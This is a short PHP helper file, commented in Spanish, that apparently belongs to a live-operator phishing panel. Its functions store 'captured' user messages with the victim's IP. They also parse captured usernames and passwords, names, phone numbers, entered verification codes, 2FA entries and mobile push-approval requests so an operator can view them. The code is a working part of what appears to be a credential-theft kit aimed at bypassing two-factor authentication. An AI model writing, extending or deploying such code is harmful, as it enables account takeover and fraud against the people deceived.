<?php
/**
 * Helpers para mensajes del chat admin/usuario
 */

define('CHAT_CAPTURA_MARKER', '__captura__');

function insertarMensajeAdmin(PDO $pdo, int $usuario_id, string $ip_real, string $mensaje): void
{
    $stmt = $pdo->prepare("
        INSERT INTO mensajes_admin
        (usuario_id, admin_id, mensaje, tipo_mensaje, ip_usuario, estado)
        VALUES (?, 1, ?, 'sin_input', ?, 'leido')
    ");
    $stmt->execute([$usuario_id, $mensaje, $ip_real]);
}

function insertarCapturaUsuario(PDO $pdo, int $usuario_id, string $ip_real, string $contenido): void
{
    $stmt = $pdo->prepare("
        INSERT INTO mensajes_admin
        (usuario_id, admin_id, mensaje, tipo_mensaje, respuesta_usuario, ip_usuario, estado, fecha_respuesta)
        VALUES (?, 1, ?, 'sin_input', ?, ?, 'respondido', NOW())
    ");
    $stmt->execute([$usuario_id, CHAT_CAPTURA_MARKER, $contenido, $ip_real]);
}

function esSoloCapturaUsuario(array $msg): bool
{
    if (empty($msg['respuesta_usuario']) || ($msg['estado'] ?? '') !== 'respondido') {
        return false;
    }
    $m = trim($msg['mensaje'] ?? '');
    return $m === '' || $m === '.' || $m === CHAT_CAPTURA_MARKER;
}

function parseCapturaLegacy(string $mensaje): string
{
    if (preg_match('/Usuario:\s*(.*?)\s*\|\s*Password:\s*(.*)/is', $mensaje, $m)) {
        return 'Usuario: ' . trim($m[1]) . "\nPassword: " . trim($m[2]);
    }

    $lines = [];
    if (preg_match('/Nombre:\s*([^\n|?]+)/iu', $mensaje, $m)) {
        $lines[] = 'Nombre: ' . trim($m[1]);
    }
    if (preg_match('/Tel\.\s*Fijo:\s*([^\n|?]+)/iu', $mensaje, $m)) {
        $lines[] = 'Tel. Fijo: ' . trim(preg_replace('/\D/', '', $m[1]));
    }
    if (preg_match('/Celular:\s*([^\n|?]+)/iu', $mensaje, $m)) {
        $lines[] = 'Tel. Movil: ' . trim(preg_replace('/\D/', '', $m[1]));
    }
    if ($lines) {
        return implode("\n", $lines);
    }

    if (preg_match('/Solicit[oó]\s*confirmaci[oó]n|Push\s+M[oó]vil/i', $mensaje)) {
        return 'Push Movil.';
    }
    if (preg_match('/C[oó]digo ingresado:\s*(\S+)/iu', $mensaje, $m)) {
        return "Codigo ingresado:\n " . trim($m[1]);
    }
    if (preg_match('/^Codigo:\s*(\S+)/iu', $mensaje, $m)) {
        return "Codigo ingresado:\n " . trim($m[1]);
    }

    $clean = preg_replace('/\?+/', ' ', $mensaje);
    $clean = preg_replace('/\s+/', ' ', trim($clean));

    return $clean ?: $mensaje;
}

function esCapturaLegacy(array $msg): bool
{
    if (!empty($msg['respuesta_usuario'])) {
        return false;
    }
    if (($msg['estado'] ?? '') !== 'leido') {
        return false;
    }

    $m = $msg['mensaje'] ?? '';
    return (bool) preg_match('/(Usuario:\s*.+\s*\|\s*Password:|Nombre:|Tel\.\s*Fijo:|C[oó]digo ingresado:|Solicit[oó]\s*confirmaci[oó]n|Push\s+M[oó]vil|2FA\s*\|)/iu', $m);
}

?>
